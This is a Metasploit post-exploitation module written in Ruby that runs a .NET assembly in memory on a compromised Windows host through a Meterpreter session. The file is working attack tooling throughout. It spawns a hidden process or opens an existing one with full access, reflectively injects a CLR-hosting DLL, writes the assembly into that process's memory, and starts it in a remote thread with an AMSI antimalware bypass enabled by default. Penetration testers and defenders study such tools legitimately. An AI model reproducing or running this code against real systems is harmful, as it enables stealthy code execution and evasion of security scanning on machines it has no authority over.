##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Execute .net Assembly (x64 only)',
      'Description' => '
        This module execute a .net assembly in memory. Refletctively load the dll that host CLR, than
        copy in memory the assembly that will be executed. Credits for Amsi bypass to Rastamouse (@_RastaMouse)
      ',
      'License' => MSF_LICENSE,
      'Author' => 'b4rtik',
      'Arch' => [ARCH_X64],
      'Platform' => 'win',
      'SessionTypes' => ['meterpreter'],
      'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
      'References' => [['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']],
      'DefaultTarget' => 0
    ))
    register_options(
      [
        OptString.new('ASSEMBLY', [true, 'Assembly file name']),
        OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory', ::File.join(Msf::Config.data_directory, 'execute-assembly')]),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
        OptInt.new('PID', [false, 'Pid  to inject', 0]),
        OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL',   [ true, 'Kill the injected process at the end of the task', false ])
      ]
    )
  end

  def run
    exe_path = gen_exe_path
    if File.file?(exe_path)
      assembly_size = File.size(exe_path)
      if datastore['ARGUMENTS'].nil?
        params_size = 0
      else
        params_size = datastore['ARGUMENTS'].length
      end
      execute_assembly(exe_path)
    else
      print_bad("Assembly not found #{exe_path}")
    end
  end

  def gen_exe_path
    if datastore['ASSEMBLYPATH'] == '' || datastore['ASSEMBLYPATH'].nil?
      exe_path = ::File.join(Msf::Config.data_directory, 'execute-assembly', datastore['ASSEMBLY'])
    else
      exe_path = ::File.join(datastore['ASSEMBLYPATH'], datastore['ASSEMBLY'])
    end
    exe_path = ::File.expand_path(exe_path)
    exe_path
  end

  def sanitize_process_name(process_name)
    if process_name.split(//).last(4).join.eql? '.exe'
      out_process_name = process_name
    else
      process_name + '.exe'
    end
    out_process_name
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad('Can not select the current process as the injection target')
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.length < 1
      print_bad("No running processes found on the target host.")
      return false
    end

    theprocess = host_processes.find {|x| x["pid"] == pid}

    !theprocess.nil?
  end

  def launch_process
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} to host CLR...")
    channelized = true
    if datastore['PID'] > 0
      channelized = false
    end
    process = client.sys.process.execute(process_name, nil, 'Channelized' => channelized, 'Hidden' => true)
    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} launched.")
    [process, hprocess]
  end

  def inject_hostclr_dll(process)
    print_status("Reflectively injecting the Host DLL into #{process.pid}..")

    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-assembly', 'HostingCLRx64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting Host into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def open_process
    print_status('Warning: output unavailable')
    print_status("Opening process #{datastore['PID']}...")
    hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} hooked.")
    [nil, hprocess]
  end

  def execute_assembly(exe_path)
    if datastore['PID'] <= 0
      process, hprocess = launch_process
    else
      process, hprocess = open_process
    end
    exploit_mem, offset = inject_hostclr_dll(hprocess)

    assembly_mem = copy_assembly(exe_path, hprocess)

    print_status('Executing...')
    hprocess.thread.create(exploit_mem + offset, assembly_mem)

    if datastore['WAIT'] > 0
      sleep(datastore['WAIT'])
    end

    if datastore['PID'] <= 0 and datastore['WAIT'] > 0
      read_output(process)
    end

    if datastore['KILL']
      print_good("Killing process #{hprocess.pid}")
      client.sys.process.kill(hprocess.pid)
    end

    print_good('Execution finished.')
  end

  def copy_assembly(exe_path, process)
    print_status("Host injected. Copy assembly into #{process.pid}...")
    int_param_size = 8
    amsi_flag_size = 1
    exe_path = gen_exe_path
    assembly_size = File.size(exe_path)
    if datastore['ARGUMENTS'].nil?
      argssize = 1
    else
      argssize = datastore['ARGUMENTS'].size + 1
    end
    payload_size = assembly_size + argssize + amsi_flag_size + int_param_size
    assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
    params = [assembly_size].pack('I*')
    params += [argssize].pack('I*')
    if datastore['AMSIBYPASS'] == true
      params += "\x01"
    else
      params += "\x02"
    end
    if datastore['ARGUMENTS'].nil?
      params += ''
    else
      params += datastore['ARGUMENTS']
    end
    params += "\x00"

    process.memory.write(assembly_mem, params + File.read(exe_path))
    print_status('Assembly copied.')
    assembly_mem
  end

  def read_output(process)
    print_status('Start reading output')
    old_timeout = client.response_timeout
    client.response_timeout = 5

    begin
      loop do
        output = process.channel.read
        if !output.nil? and output.length > 0
          output.split("\n").each { |x| print_good(x) }
        end
        break if output.nil? or output.length == 0
      end
    rescue Rex::TimeoutError => e

    rescue ::Exception => e
      print_error("Exception: #{e.inspect}")
    end

    client.response_timeout = old_timeout
    print_status('End output.')
  end
end
